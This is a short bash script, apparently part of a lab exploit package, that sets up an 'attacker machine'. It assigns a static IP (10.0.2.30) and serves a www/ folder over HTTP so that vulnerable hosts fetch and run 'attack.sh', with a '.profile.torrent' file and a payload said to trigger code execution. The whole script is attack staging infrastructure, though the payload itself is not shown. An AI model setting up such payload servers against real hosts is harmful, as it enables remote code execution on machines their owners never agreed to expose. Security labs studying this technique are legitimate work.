#!/bin/bash

#
# This script should be run on the attacker machine.
#

set -e
cat <<EOF
# This script will set up this machine to server malicious webpages that may
# lead to code execution on vulnerable hosts.
#
# Press Any key to continue with installation
# Ctrl-C to cancel
EOF

read -n 1 -s

echo "-> Setting IP to 10.0.2.30"
sudo tee -a /etc/network/interfaces > /dev/null <<EOF

auto enp0s3
iface enp0s3 inet static
	address 10.0.2.30
	netmask 255.255.255.0

EOF

sudo ifup enp0s3

cat <<EOF
-> The attack script will be requested from http://10.0.2.30/attack.sh
-> You need to serve that file for this attack to be successful
-> A 'attack.sh' file is provided in the www/ folder
-> Running 'sudo python3 -m http.server 80' (from www/) will serve this file.

-> If you want to get the attack file from a different location you will need
-> to create a new '.profile.torrent' file and update the attack payload
-> to run that torrent file.
EOF

echo "-> Starting webserver on port 9091"
echo "->	(This will serve the attack payload and run the exploit)"
echo "->	(output logged to ./http.server.9091.log)"
cd www
python3 -m http.server 9091

echo "-> DONE!"
